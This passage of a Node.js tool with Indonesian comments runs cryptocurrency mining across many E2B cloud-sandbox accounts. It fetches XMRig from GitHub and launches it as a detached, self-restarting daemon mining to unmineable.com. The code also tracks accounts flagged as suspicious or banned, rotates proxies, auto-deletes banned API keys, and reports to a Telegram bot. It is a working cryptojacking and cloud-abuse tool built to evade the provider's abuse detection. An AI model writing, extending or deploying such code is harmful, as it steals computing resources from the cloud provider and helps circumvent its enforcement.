  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('[TELEGRAM WARN] Token bot atau Chat ID belum dikonfigurasi.');
    return { ok: false, error: 'Token/Chat ID missing' };
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: htmlText,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
    const data = await res.json();
    if (!data.ok) {
      // Tangani rate limit 429 Telegram jika banyak RDP mengirim bersamaan
      if (data.error_code === 429 && retryCount < 3) {
        const waitSec = (data.parameters && data.parameters.retry_after) ? data.parameters.retry_after : 1.5;
        console.warn(`[TELEGRAM 429] Rate limit tercapai, mencoba ulang dalam ${waitSec}s...`);
        await sleep((waitSec + 0.5) * 1000);
        return sendTelegramMessage(htmlText, retryCount + 1);
      }
      if (data.description && data.description.includes('chat not found')) {
        console.warn(`[TELEGRAM WARN] Chat ID (${TELEGRAM_CHAT_ID}) belum membuka chat dengan bot. Buka https://t.me/LogsE2BS_Bot lalu tekan /start.`);
      } else {
        console.warn('[TELEGRAM WARN] Gagal mengirim pesan ke Telegram:', data.description);
      }
      return { ok: false, error: data.description };
    }
    return { ok: true, data };
  } catch (err) {
    console.warn('[TELEGRAM ERROR]', err.message);
    return { ok: false, error: err.message };
  }
}

function getAccountDurationInfo(tokenOrSnapshot) {
  const now = Date.now();
  const runStart = tokenOrSnapshot.run_started_at ? new Date(tokenOrSnapshot.run_started_at).getTime() : null;
  const cycleStart = tokenOrSnapshot.cycle_started_at ? new Date(tokenOrSnapshot.cycle_started_at).getTime() : runStart;

  const cycleMinutes = runStart ? Math.max(1, Math.round((now - cycleStart) / 60000)) : 0;
  const totalMinutes = runStart ? Math.max(1, Math.round((now - runStart) / 60000)) : 0;
  const rerunCount = typeof tokenOrSnapshot.rerun_count === 'number' ? tokenOrSnapshot.rerun_count : 0;

  let rerunStatusText = '';
  let durationText = '';

  if (rerunCount === 0) {
    rerunStatusText = 'Belum pernah di-rerun (0x)';
    durationText = runStart ? `Menit ke-${cycleMinutes}` : 'Menit ke-0 (Sebelum running)';
  } else {
    rerunStatusText = `Sudah pernah di-rerun ${rerunCount}x`;
    durationText = `Menit ke-${cycleMinutes} (pada siklus rerun ke-${rerunCount}x)`;
  }

  return {
    cycleMinutes,
    totalMinutes,
    rerunCount,
    rerunStatusText,
    durationText,
  };
}

async function logTelegramRerun(tokenId, options = {}) {
  const t = tokens[tokenId];
  if (!t) return;
  const tokenName = t.name || tokenId;
  const rerunCount = t.rerun_count || 1;
  const info = getAccountDurationInfo(t);
  const prevMin = options.prevMinutes || info.cycleMinutes || 60;
  const targetContainers = Math.min((t.config || {}).total || DEFAULT_TOTAL, MAX_TOTAL);
  const execMode = t.config?.exec_mode || DEFAULT_EXEC_MODE;
  const modeInfo = EXEC_MODES[execMode]?.name || execMode;
  const cpuPct = Math.min(100, Math.max(1, parseInt(t.config?.cpu_percent, 10) || DEFAULT_CPU_PERCENT));
  const threads = t.config?.threads || cpuPercentToThreads(cpuPct);
  const timeStr = formatWIB();

  const msg = [
    `🔄 <b>[LOGS AKUN RERUN]</b>`,
    `━━━━━━━━━━━━━━━━━━`,
    `🖥️ <b>RDP / Host:</b> <code>${escapeHtml(RDP_NAME)}</code>`,
    `🏷️ <b>Akun:</b> <code>${escapeHtml(tokenName)}</code>`,
    `🔢 <b>Status Rerun:</b> <b>Rerun ke-${rerunCount}x</b>`,
    `⏱️ <b>Durasi Sesi Sebelumnya:</b> ${prevMin} Menit`,
    `⏳ <b>Total Runtime Akun:</b> ${info.totalMinutes} Menit`,
    `📦 <b>Target Container:</b> ${targetContainers} Sandbox (8 Core / 8 GB)`,
    `⚡ <b>CPU Setting:</b> ${cpuPct}% (${threads} Threads / Cores)`,
    `⚙️ <b>Mode Eksekusi:</b> ${escapeHtml(modeInfo)}`,
    `📅 <b>Waktu:</b> ${timeStr}`,
    `━━━━━━━━━━━━━━━━━━`,
    `<i>⚡ Sesi penambangan berikutnya otomatis diperbarui & dilanjutkan sesuai settingan CPU (${cpuPct}%).</i>`,
  ].join('\n');

  addLog(tokenId, `📢 [TELEGRAM] [${RDP_NAME}] Mengirim notifikasi RERUN (ke-${rerunCount}x, durasi sesi: ${prevMin}m)...`);
  await sendTelegramMessage(msg);
}

async function logTelegramSus(tokenId, reason, options = {}) {
  const t = tokens[tokenId];
  if (!t) return;

  const now = Date.now();
  // Anti-spam cooldown for SUS: 8 menit per akun jika reason sama
  if (t.last_sus_at && (now - t.last_sus_at < 8 * 60 * 1000) && t.last_sus_reason === reason) {
    return;
  }

  t.is_sus = true;
  t.sus_count = (t.sus_count || 0) + 1;
  t.last_sus_at = now;
  t.last_sus_reason = reason;

  const tokenName = t.name || tokenId;
  const info = getAccountDurationInfo(t);
  const activeCount = Object.keys(t.sandboxes || {}).length;
  const targetContainers = Math.min((t.config || {}).total || DEFAULT_TOTAL, MAX_TOTAL);
  const timeStr = formatWIB();

  const msg = [
    `⚠️ <b>[LOGS AKUN SUS / MENCURIGAKAN]</b>`,
    `━━━━━━━━━━━━━━━━━━`,
    `🖥️ <b>RDP / Host:</b> <code>${escapeHtml(RDP_NAME)}</code>`,
    `🏷️ <b>Akun:</b> <code>${escapeHtml(tokenName)}</code>`,
    `⏱️ <b>Terdeteksi di:</b> <b>${info.durationText}</b>`,
    `🔄 <b>Status Rerun:</b> <b>${info.rerunStatusText}</b>`,
    `⏳ <b>Total Runtime:</b> ${info.totalMinutes} Menit`,
    `🔍 <b>Indikasi Sus:</b> <i>${escapeHtml(reason)}</i>`,
    `📦 <b>Container Aktif:</b> ${activeCount}/${targetContainers} Sandbox`,
    `📅 <b>Waktu:</b> ${timeStr}`,
    `━━━━━━━━━━━━━━━━━━`,
    `<i>⚠️ Sistem terus memantau & melakukan penanganan otomatis.</i>`,
  ].join('\n');

  addLog(tokenId, `⚠️ [TELEGRAM] [${RDP_NAME}] Mengirim notifikasi AKUN SUS (${info.durationText}, ${info.rerunStatusText}): ${reason}`);
  await sendTelegramMessage(msg);
  saveTokens();
}

async function logTelegramBanned(tokenSnapshot, reason) {
  const tokenName = tokenSnapshot.name || tokenSnapshot.id;
  const info = getAccountDurationInfo(tokenSnapshot);
  const maskedKey = tokenSnapshot.api_key ? `${tokenSnapshot.api_key.slice(0, 7)}...${tokenSnapshot.api_key.slice(-4)}` : '-';
  const timeStr = formatWIB();

  const msg = [
    `🚫 <b>[LOGS AKUN BANNED]</b>`,
    `━━━━━━━━━━━━━━━━━━`,
    `🖥️ <b>RDP / Host:</b> <code>${escapeHtml(RDP_NAME)}</code>`,
    `🏷️ <b>Akun:</b> <code>${escapeHtml(tokenName)}</code>`,
    `⏱️ <b>Banned di:</b> <b>${info.durationText}</b>`,
    `🔄 <b>Status Rerun Saat Banned:</b> <b>${info.rerunStatusText}</b>`,
    `⏳ <b>Total Runtime Sebelum Ban:</b> ${info.totalMinutes} Menit`,
    `❌ <b>Alasan Ban:</b> <code>${escapeHtml(reason)}</code>`,
    `🔑 <b>API Key:</b> <code>${escapeHtml(maskedKey)}</code>`,
    `📅 <b>Waktu:</b> ${timeStr}`,
    `━━━━━━━━━━━━━━━━━━`,
    `<i>🚫 Akun otomatis dihentikan dan dihapus dari dashboard.</i>`,
  ].join('\n');

  console.log(`[TELEGRAM BANNED] [${RDP_NAME}] Mengirim log banned untuk ${tokenName} (${info.durationText}, ${info.rerunStatusText})...`);
  await sendTelegramMessage(msg);
}

/**
 * Deteksi apakah error menunjukkan akun / API Key terblokir, banned, atau invalid
 */
function isBannedReason(err) {
  if (!err) return false;
  const str = String(err).toLowerCase();

  // Kecualikan false positive (rate limit, template not found, koneksi sementara, build notice)
  if (
    str.includes('429') ||
    str.includes('rate') ||
    str.includes('too many') ||
    str.includes('timeout') ||
    str.includes('econnreset') ||
    str.includes('network') ||
    str.includes('fetch failed') ||
    str.includes('template') ||
    str.includes('build')
  ) {
    return false;
  }

  return (
    str.includes('invalid api key') ||
    str.includes('api key not found') ||
    str.includes('api key revoked') ||
    str.includes('unauthorized') ||
    str.includes('account suspended') ||
    str.includes('account banned') ||
    str.includes('access denied') ||
    /\b(401|403)\b/.test(str)
  );
}

/**
 * Hapus otomatis token yang terkena reason banned dari sistem dan dashboard
 */
async function deleteBannedToken(tokenId, reason) {
  const t = tokens[tokenId];
  if (!t) return;
  const tokenName = t.name || tokenId;

  console.warn(`[AUTO-DELETE BANNED] Token '${tokenName}' (${tokenId}) terdeteksi BANNED (${reason}). Menghapus otomatis...`);
  addLog(tokenId, `🚫 [AUTO-DELETE BANNED] Akun/Token terdeteksi BANNED atau TIDAK VALID (${reason}). Token ini otomatis dihapus dari dashboard.`);

  // Snapshot token info sebelum di-delete
  const tokenSnapshot = {
    id: tokenId,
    name: tokenName,
    api_key: t.api_key,
    rerun_count: t.rerun_count || 0,
    run_started_at: t.run_started_at,
    cycle_started_at: t.cycle_started_at,
    sus_count: t.sus_count || 0,
    last_sus_reason: t.last_sus_reason,
  };

  // Kirim notifikasi BANNED ke Telegram Bot
  await logTelegramBanned(tokenSnapshot, reason);

  // Kirim toast alert ke UI
  broadcast({
    type: 'token_banned',
    token_id: tokenId,
    token_name: tokenName,
    reason: String(reason),
    rerun_count: tokenSnapshot.rerun_count,
  }).catch(() => { });

  // Batalkan task jika sedang jalan
  const ctrl = tasks[tokenId];
  if (ctrl) {
    ctrl.cancel = true;
    ctrl.done = true;
  }

  // Keluarkan dari sequenceQueue
  const qIdx = sequenceQueue.indexOf(tokenId);
  if (qIdx !== -1) sequenceQueue.splice(qIdx, 1);
  activeProvisioningTokenIds.delete(tokenId);

  // Bersihkan sandbox jika masih ada (best effort)
  if (t.api_key && t.sandboxes) {
    for (const sb of Object.values(t.sandboxes)) {
      if (sb && sb.id) killE2BSandbox(t.api_key, sb.id, t.proxy_url).catch(() => { });
    }
  }

  // Jeda 800ms agar websocket log sempat terkirim sebelum data dihapus
  await sleep(800);

  delete tokens[tokenId];
  delete tasks[tokenId];
  delete logs[tokenId];

  saveTokens();
  await broadcastState();
}

function getNextTokenNumber() {
  let maxNum = 0;
  for (const t of Object.values(tokens)) {
    const m = (t.name || '').match(/(?:Token|Akun)\s*#?(\d+)/i);
    if (m) {
      const num = parseInt(m[1], 10);
      if (num > maxNum) maxNum = num;
    }
  }
  return Math.max(maxNum + 1, Object.keys(tokens).length + 1);
}

function getAllTokensSummary() {
  const tokenEntries = Object.entries(tokens);
  return tokenEntries.map(([tid, t], idx) => {
    const sandboxes = t.sandboxes || {};
    const totalHr = Object.values(sandboxes).reduce((a, s) => a + (s.hashrate_10s || 0), 0);
    const miningCount = Object.values(sandboxes).filter(s => s.status === 'mining').length;
    const deadCount = Object.values(sandboxes).filter(s => ['dead', 'failed'].includes(s.status)).length;

    const isProvisioning = activeProvisioningTokenIds.has(tid);
    const queueIdx = sequenceQueue.indexOf(tid);
    const isRunning = !!(tasks[tid] && !tasks[tid].done);

    let runStatus = 'idle';
    if (isProvisioning) {
      runStatus = 'provisioning';
    } else if (queueIdx !== -1) {
      runStatus = 'queued';
    } else if (isRunning) {
      runStatus = 'running';
    }

    // Clean display name: jika nama user kosong atau cuma raw api key, tampilkan Token N
    let displayName = (t.name || '').trim();
    if (!displayName || displayName.startsWith('e2b_') || displayName === t.api_key) {
      displayName = `Token ${idx + 1}`;
    }

    const maskedKey = t.api_key ? `${t.api_key.slice(0, 7)}...${t.api_key.slice(-4)}` : '';

    const proxyEnabled = isProxyEnabled();
    const maskedProxy = (proxyEnabled && t.proxy_url) ? maskProxy(t.proxy_url) : '';
    const tokenCpuPct = Math.min(100, Math.max(1, parseInt(t.config?.cpu_percent, 10) || DEFAULT_CPU_PERCENT));
    const tokenThreads = t.config?.threads || cpuPercentToThreads(tokenCpuPct);

    return {
      id: tid,
      name: displayName,
      raw_name: t.name,
      order_num: idx + 1,
      masked_key: maskedKey,
      has_api_key: !!t.api_key,
      proxy_url: maskedProxy,
      has_proxy: proxyEnabled && !!t.proxy_url,
      use_proxy: proxyEnabled,
      template_id: t.template_id || '',
      template_status: t.template_status || (t.template_id ? 'ready' : 'none'),
      run_started_at: t.run_started_at || null,
      cycle_started_at: t.cycle_started_at || null,
      rerun_count: typeof t.rerun_count === 'number' ? t.rerun_count : 0,
      is_sus: !!t.is_sus,
      sus_count: typeof t.sus_count === 'number' ? t.sus_count : 0,
      last_sus_reason: t.last_sus_reason || '',
      runtime_minutes: t.run_started_at ? Math.max(1, Math.round((Date.now() - new Date(t.run_started_at).getTime()) / 60000)) : 0,
      cycle_minutes: t.cycle_started_at ? Math.max(1, Math.round((Date.now() - new Date(t.cycle_started_at).getTime()) / 60000)) : 0,
      total_sandboxes: Object.keys(sandboxes).length,
      target_sandboxes: Math.min((t.config || {}).total || DEFAULT_TOTAL, MAX_TOTAL),
      mining: miningCount,
      dead: deadCount,
      total_hashrate: Math.round(totalHr * 10) / 10,
      running: isRunning,
      run_status: runStatus,
      queue_pos: queueIdx !== -1 ? queueIdx + 1 : 0,
      cpu_percent: tokenCpuPct,
      threads: tokenThreads,
      miner_type: t.config?.miner_type || DEFAULT_MINER_TYPE,
      miner_info: MINER_TYPES[t.config?.miner_type || DEFAULT_MINER_TYPE] || MINER_TYPES.xmrig,
      config: {
        ...(t.config || {}),
        cpu_percent: tokenCpuPct,
        threads: tokenThreads,
        miner_type: t.config?.miner_type || DEFAULT_MINER_TYPE,
      },
      hours: t.config?.hours || DEFAULT_HOURS,
      exec_mode: t.config?.exec_mode || DEFAULT_EXEC_MODE,
      exec_mode_info: EXEC_MODES[t.config?.exec_mode || DEFAULT_EXEC_MODE] || EXEC_MODES.watchdog,
      cpus: REQUIRED_CPUS,
      mem_mb: REQUIRED_MEM_MB,
      sandboxes: Object.fromEntries(
        Object.entries(sandboxes).map(([slot, s]) => {
          const sbCpu = Math.min(100, Math.max(1, parseInt(s.cpu_percent || tokenCpuPct, 10) || DEFAULT_CPU_PERCENT));
          const sbThreads = s.threads || cpuPercentToThreads(sbCpu);
          const sbMinerType = s.miner_type || t.config?.miner_type || DEFAULT_MINER_TYPE;
          return [slot, {
            id: s.id || '',
            name: s.name || '',
            status: s.status || 'unknown',
            hashrate_10s: Math.round((s.hashrate_10s || 0) * 10) / 10,
            hashrate_60s: Math.round((s.hashrate_60s || 0) * 10) / 10,
            hashrate_15m: Math.round((s.hashrate_15m || 0) * 10) / 10,
            last_check: s.last_check || '',
            started_at: s.started_at || '',
            end_at: s.end_at || '',
            watchdog: s.watchdog || 'active',
            restarts: s.restarts || 0,
            watchdog_mode: s.watchdog_mode || 'watchdog',
            exec_mode: s.exec_mode || t.config?.exec_mode || DEFAULT_EXEC_MODE,
            exec_mode_info: EXEC_MODES[s.exec_mode || t.config?.exec_mode || DEFAULT_EXEC_MODE] || EXEC_MODES.watchdog,
            miner_type: sbMinerType,
            miner_info: MINER_TYPES[sbMinerType] || MINER_TYPES.xmrig,
            hours: s.hours || t.config?.hours || DEFAULT_HOURS,
            cpu_percent: sbCpu,
            threads: sbThreads,
          }];
        })
      ),
    };
  });
}

// ============================================================
// MINER SETUP & WATCHDOG
// ============================================================

async function setupMiner(apiKey, sandboxId, wallet, cpuPercent = DEFAULT_CPU_PERCENT, execMode = DEFAULT_EXEC_MODE, proxyUrl = '', minerType = DEFAULT_MINER_TYPE) {
  const cpuPct = Math.min(100, Math.max(1, parseInt(cpuPercent, 10) || DEFAULT_CPU_PERCENT));
  const threadCount = cpuPercentToThreads(cpuPct);
  const safeWallet = (wallet || getActiveWallet()).replace(/"/g, '\\"');
  const activeMiner = 'xmrig';
  const minerInfo = MINER_TYPES.xmrig;
  const modeDisplay = `${minerInfo.name} (${EXEC_MODES[execMode]?.short || 'Watchdog'})`;

  // ── Python Watchdog Supervisor (XMRig Miner) ──
  const watchdogScript = [
    `import os`,
    `import sys`,
    `import time`,
    `import json`,
    `import signal`,
    `import subprocess`,
    `import urllib.request`,
    `import re`,
    ``,
    `WALLET = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("WALLET", "${safeWallet}")`,
    `THREADS = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("THREADS", "${threadCount}"))`,
    `CPU_PERCENT = int(sys.argv[3]) if len(sys.argv) > 3 else int(os.environ.get("CPU_PERCENT", "${cpuPct}"))`,
    `MINER_TYPE = "xmrig"`,
    `STAT_FILE = "/tmp/miner.status"`,
    `WD_STAT_FILE = "/tmp/watchdog.status"`,
    `PID_FILE = "/tmp/watchdog.pid"`,
    `CONFIG_FILE = "/tmp/xmrig_config.json"`,
    `LOG_FILE = "/tmp/xmrig.log"`,
    `STDOUT_LOG = "/tmp/xmrig_stdout.log"`,
    ``,
    `try:`,
    `    with open(PID_FILE, "w") as f:`,
    `        f.write(str(os.getpid()))`,
    `except Exception:`,
    `    pass`,
    ``,
    `XMRIG_BIN = "/usr/local/bin/xmrig"`,
    `if not os.path.exists(XMRIG_BIN):`,
    `    for p in ["/tmp/xmrig-dir/xmrig", "/tmp/xmrig", "/usr/bin/xmrig"]:`,
    `        if os.path.exists(p):`,
    `            XMRIG_BIN = p`,
    `            break`,
    ``,
    `restarts = 0`,
    `start_time = time.time()`,
    `child_proc = None`,
    ``,
    `def write_xmrig_config():`,
    `    try:`,
    `        cfg = {`,
    `            "autosave": False,`,
    `            "cpu": {`,
    `                "enabled": True,`,
    `                "huge-pages": True,`,
    `                "hw-aes": None,`,
    `                "priority": None,`,
    `                "memory-pool": False,`,
    `                "max-threads-hint": CPU_PERCENT,`,
    `                "asm": True`,
    `            },`,
    `            "opencl": False,`,
    `            "cuda": False,`,
    `            "pools": [`,
    `                {`,
    `                    "algo": "rx/0",`,
    `                    "coin": None,`,
    `                    "url": "rx.unmineable.com:443",`,
    `                    "user": WALLET,`,
    `                    "pass": "x",`,
    `                    "rig-id": None,`,
    `                    "nicehash": False,`,
    `                    "keepalive": True,`,
    `                    "enabled": True,`,
    `                    "tls": True`,
    `                }`,
    `            ],`,
    `            "http": {`,
    `                "enabled": True,`,
    `                "host": "127.0.0.1",`,
    `                "port": 8080,`,
    `                "access-token": "miner123",`,
    `                "restricted": False`,
    `            },`,
    `            "print-time": 5,`,
    `            "donate-level": 1,`,
    `            "log-file": LOG_FILE`,
    `        }`,
    `        with open(CONFIG_FILE, "w") as f:`,
    `            json.dump(cfg, f, indent=2)`,
    `    except Exception as e:`,
    `        print(f"[WATCHDOG] Gagal tulis config.json: {e}", flush=True)`,
    ``,
    `def write_status(status, h10=0.0, h60=0.0, h15m=0.0, extra=None):`,
    `    try:`,
    `        data = {`,
    `            "status": status,`,
    `            "miner_type": MINER_TYPE,`,
    `            "cpu_percent": CPU_PERCENT,`,
    `            "threads": THREADS,`,
    `            "hashrate_10s": round(float(h10), 1),`,
    `            "hashrate_60s": round(float(h60), 1),`,
    `            "hashrate_15m": round(float(h15m), 1),`,
    `            "restarts": restarts,`,
    `            "uptime": int(time.time() - start_time),`,
    `            "watchdog": "active",`,
    `            "mode": "watchdog",`,
    `            "ts": int(time.time() * 1000)`,
    `        }`,
    `        if extra:`,
    `            data.update(extra)`,
    `        payload = json.dumps(data)`,
    `        for target in [STAT_FILE, WD_STAT_FILE]:`,
    `            tmp = target + ".tmp"`,
    `            with open(tmp, "w") as f:`,
    `                f.write(payload)`,
    `            os.replace(tmp, target)`,
    `    except Exception:`,
    `        pass`,
    ``,
    `def get_hashrate_api():`,
    `    try:`,
    `        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))`,
    `        req = urllib.request.Request(`,
    `            "http://127.0.0.1:8080/2/summary",`,
    `            headers={"Authorization": "Bearer miner123", "User-Agent": "Watchdog/1.0"}`,
    `        )`,
    `        with opener.open(req, timeout=3) as resp:`,
    `            data = json.loads(resp.read().decode())`,
    `            total = data.get("hashrate", {}).get("total", [])`,
    `            h10 = float(total[0]) if len(total) > 0 and total[0] is not None else 0.0`,
    `            h60 = float(total[1]) if len(total) > 1 and total[1] is not None else 0.0`,
    `            h15m = float(total[2]) if len(total) > 2 and total[2] is not None else 0.0`,
    `            if h10 == 0.0:`,
    `                threads = data.get("hashrate", {}).get("threads", [])`,
    `                t_sum = sum([float(t[0]) for t in threads if len(t) > 0 and t[0] is not None])`,
    `                if t_sum > 0:`,
    `                    h10 = t_sum`,
    `            return True, h10, h60, h15m`,
    `    except Exception:`,
    `        pass`,
    `    try:`,
    `        if os.path.exists(LOG_FILE):`,
    `            with open(LOG_FILE, "r", errors="ignore") as f:`,
    `                lines = f.readlines()[-20:]`,
    `            for line in reversed(lines):`,
    `                clean = re.sub(r'\\x1b\\[[0-9;]*m', '', line)`,
    `                m = re.search(r'speed\\s+10s/60s/15m\\s+([\\d.]+|n/a)\\s+([\\d.]+|n/a)\\s+([\\d.]+|n/a)', clean)`,
    `                if m:`,
    `                    h10 = float(m.group(1)) if m.group(1) != 'n/a' else 0.0`,
    `                    h60 = float(m.group(2)) if m.group(2) != 'n/a' else 0.0`,
    `                    h15m = float(m.group(3)) if m.group(3) != 'n/a' else 0.0`,
    `                    return True, h10, h60, h15m`,
    `    except Exception:`,
    `        pass`,
    `    return False, 0.0, 0.0, 0.0`,
    ``,
    `def ensure_xmrig_bin():`,
    `    global XMRIG_BIN`,
    `    if os.path.exists(XMRIG_BIN):`,
    `        return True`,
    `    for p in ["/tmp/xmrig-dir/xmrig", "/tmp/xmrig", "/usr/bin/xmrig"]:`,
    `        if os.path.exists(p):`,
    `            XMRIG_BIN = p`,
    `            return True`,
    `    try:`,
    `        print("[WATCHDOG] Binary XMRig belum ada di host, mengunduh otomatis...", flush=True)`,
    `        dl_url = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"`,
    `        subprocess.run(["curl", "-fsSL", dl_url, "-o", "/tmp/xmrig.tar.gz"], timeout=35)`,
    `        subprocess.run(["tar", "-xf", "/tmp/xmrig.tar.gz", "-C", "/usr/local/bin", "--strip-components=1"], timeout=20)`,
    `        subprocess.run(["chmod", "+x", "/usr/local/bin/xmrig"], timeout=5)`,
    `        if os.path.exists("/usr/local/bin/xmrig"):`,
    `            XMRIG_BIN = "/usr/local/bin/xmrig"`,
    `            return True`,
    `    except Exception as e:`,
    `        print(f"[WATCHDOG] Auto-download xmrig gagal: {e}", flush=True)`,
    `    return False`,
    ``,
    `def start_miner():`,
    `    global child_proc`,
    `    write_xmrig_config()`,
    `    if not ensure_xmrig_bin():`,
    `        print(f"[WATCHDOG ERROR] Binary XMRig tidak ditemukan di {XMRIG_BIN}", flush=True)`,
    `        return None`,
    `    cmd = [`,
    `        XMRIG_BIN,`,
    `        "-c", CONFIG_FILE,`,
    `        "--no-color",`,
    `        f"--threads={THREADS}"`,
    `    ]`,
    `    try:`,
    `        with open(STDOUT_LOG, "a") as out:`,
    `            child_proc = subprocess.Popen(cmd, stdout=out, stderr=out, start_new_session=True)`,
    `        return child_proc`,
    `    except Exception as e:`,
    `        print(f"[WATCHDOG ERROR] Gagal spawn XMRig: {e}", flush=True)`,
    `        return None`,
    ``,
    `def shutdown(signum, frame):`,
    `    global child_proc`,
    `    write_status("stopped")`,
    `    if child_proc and child_proc.poll() is None:`,
    `        try:`,
    `            child_proc.terminate()`,
    `            child_proc.wait(timeout=3)`,
    `        except Exception:`,
    `            try:`,
    `                child_proc.kill()`,
    `            except Exception:`,
    `                pass`,
    `    sys.exit(0)`,
    ``,
    `signal.signal(signal.SIGTERM, shutdown)`,
    `signal.signal(signal.SIGINT, shutdown)`,
    ``,
    `write_status("starting")`,
    `start_miner()`,
    ``,
    `last_api_success = time.time()`,
    `while True:`,
    `    time.sleep(4)`,
    `    if child_proc is None or child_proc.poll() is not None:`,
    `        restarts += 1`,
    `        code = child_proc.poll() if child_proc else 'None'`,
    `        print(f"[WATCHDOG] XMRIG terminated (exit code: {code}). Auto-healing #{restarts}...", flush=True)`,
    `        write_status("restarting")`,
    `        time.sleep(3)`,
    `        start_miner()`,
    `        last_api_success = time.time()`,
    `        continue`,
    `    ok, h10, h60, h15m = get_hashrate_api()`,
    `    if ok:`,
    `        last_api_success = time.time()`,
    `        write_status("mining", h10, h60, h15m)`,
    `    else:`,
    `        if (time.time() - last_api_success > 180) and (time.time() - start_time > 180):`,
    `            print(f"[WATCHDOG] Pool stalled / hashrate 0 selama 180 detik. Auto-restarting {MINER_TYPE}...", flush=True)`,
    `            try:`,
    `                if child_proc and child_proc.poll() is None:`,
    `                    child_proc.terminate()`,
    `                    time.sleep(1)`,
    `                    child_proc.kill()`,
    `            except Exception:`,
    `                pass`,
    `            restarts += 1`,
    `            write_status("restarting")`,
    `            time.sleep(2)`,
    `            start_miner()`,
    `            last_api_success = time.time()`,
    `            continue`,
    `        is_alive = child_proc.poll() is None`,
    `        if is_alive:`,
    `            write_status("mining" if (time.time() - start_time > 15) else "starting", h10, h60, h15m)`,
    `        else:`,
    `            write_status("restarting")`,
  ].join('\n');

  try {
    const [sb, err] = await connectE2BSandbox(apiKey, sandboxId, proxyUrl);
    if (!sb) {
      console.error(`[SETUP ERROR] Gagal connect ke sandbox ${sandboxId}: ${err}`);
      return false;
    }

    // 1. Pastikan konfigurasi & binary XMRig tersedia (fallback download jika base template)
    const xmrigCfg = {
      "autosave": false,
      "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "max-threads-hint": cpuPct,
        "asm": true
      },
      "opencl": false,
      "cuda": false,
      "pools": [
        {
          "algo": "rx/0",
          "coin": null,
          "url": "rx.unmineable.com:443",
          "user": safeWallet,
          "pass": "x",
          "rig-id": null,
          "nicehash": false,
          "keepalive": true,
          "enabled": true,
          "tls": true
        }
      ],
      "http": {
        "enabled": true,
        "host": "127.0.0.1",
        "port": 8080,
        "access-token": "miner123",
        "restricted": false
      },
      "print-time": 5,
      "donate-level": 1,
      "log-file": "/tmp/xmrig.log"
    };
    await sb.files.write('/tmp/xmrig_config.json', JSON.stringify(xmrigCfg, null, 2));

    try {
      await sb.commands.run(
        'if [ ! -f /usr/local/bin/xmrig ] && [ ! -f /tmp/xmrig ]; then ' +
        'echo "[SETUP] Downloading XMRig 6.22.2..."; ' +
        'curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o /tmp/xmrig.tar.gz && ' +
        'tar -xf /tmp/xmrig.tar.gz -C /usr/local/bin --strip-components=1 && ' +
        'chmod +x /usr/local/bin/xmrig 2>/dev/null || true; ' +
        'rm -rf /tmp/xmrig.tar.gz; ' +
        'fi',
        { timeoutMs: 35000 }
      );
    } catch (dlErr) {
      // Abaikan jika sudah ada binary atau warning download
    }

    // 2. Tulis Watchdog script
    await sb.files.write('/tmp/watchdog.py', watchdogScript);

    // 3. Stop proses lama & bersihkan file status dengan aman tanpa killall python3
    try {
      await sb.commands.run(
        'pkill -9 -f "/tmp/watchdog.py" 2>/dev/null || true; ' +
        'pkill -9 -x xmrig 2>/dev/null || true; ' +
        'rm -f /usr/local/bin/config.json /tmp/xmrig-dir/config.json /root/config.json /tmp/config.json /tmp/watchdog.status /tmp/miner.status /tmp/xmrig.log /tmp/xmrig_stdout.log 2>/dev/null || true',
        { timeoutMs: 10000 }
      );
    } catch (_) { }

    // 4. Pastikan binary executable
    try {
      await sb.commands.run('chmod +x /usr/local/bin/xmrig /tmp/watchdog.py 2>/dev/null || true', { timeoutMs: 8000 });
    } catch (_) { }

    // 5. Jalankan Watchdog Supervisor di BACKGROUND sebagai detached Linux daemon
    // Menggunakan nohup & redirection (</dev/null >/tmp/watchdog.log 2>&1 &) agar proses berjalan mandiri di background container tanpa terikat ke sesi shell/RPC E2B
    await sb.commands.run(
      `nohup python3 -u /tmp/watchdog.py "${safeWallet}" "${threadCount}" "${cpuPct}" "${activeMiner}" </dev/null >/tmp/watchdog.log 2>&1 &`,
      { timeoutMs: 15000 }
    );

    // 6. Tunggu sejenak untuk verifikasi
    await sleep(2500);
    const verify = await sb.commands.run('pgrep -a xmrig 2>/dev/null || pgrep -a python3 2>/dev/null || echo "NONE"', { timeoutMs: 10000 });
    const isLive = !verify.stdout.includes('NONE') && (verify.stdout.includes('xmrig') || verify.stdout.includes('python3') || verify.stdout.includes('watchdog'));

    if (isLive) {
      console.log(`[SETUP] ✅ Native Watchdog Supervisor | ${modeDisplay} | CPU: ${cpuPct}% (${threadCount} Threads) (PID: ${verify.stdout.trim()})`);
      return true;
    } else {
      console.warn(`[SETUP] Verifikasi watchdog/miner: sedang starting inisialisasi (${modeDisplay})...`);
      return true;
    }
  } catch (e) {
    console.error('[SETUP ERROR]', e.message);
    return false;
  }
}



async function checkMiner(apiKey, sandboxId, proxyUrl = '') {
  const cmd = `
# 1. Baca status miner dari file status Watchdog (/tmp/miner.status atau /tmp/watchdog.status)
if [ -f "/tmp/miner.status" ]; then
  cat /tmp/miner.status 2>/dev/null | tr -d '\\r\\n'
  echo ""
elif [ -f "/tmp/watchdog.status" ]; then
  cat /tmp/watchdog.status 2>/dev/null | tr -d '\\r\\n'
  echo ""
fi

# 2. Cek Watchdog supervisor aktif
WD_PID=""
if [ -f "/tmp/watchdog.pid" ]; then
  C_PID=$(cat /tmp/watchdog.pid 2>/dev/null | tr -d '\\r\\n')
  if kill -0 "$C_PID" 2>/dev/null; then
    WD_PID="$C_PID"
  fi
fi
if [ -z "$WD_PID" ]; then
  WD_PID=$(pgrep -f "python3.*/tmp/watchdog\\.py" 2>/dev/null | head -1 || true)
fi
if [ -n "$WD_PID" ]; then
  echo "WD_RUNNING:1"
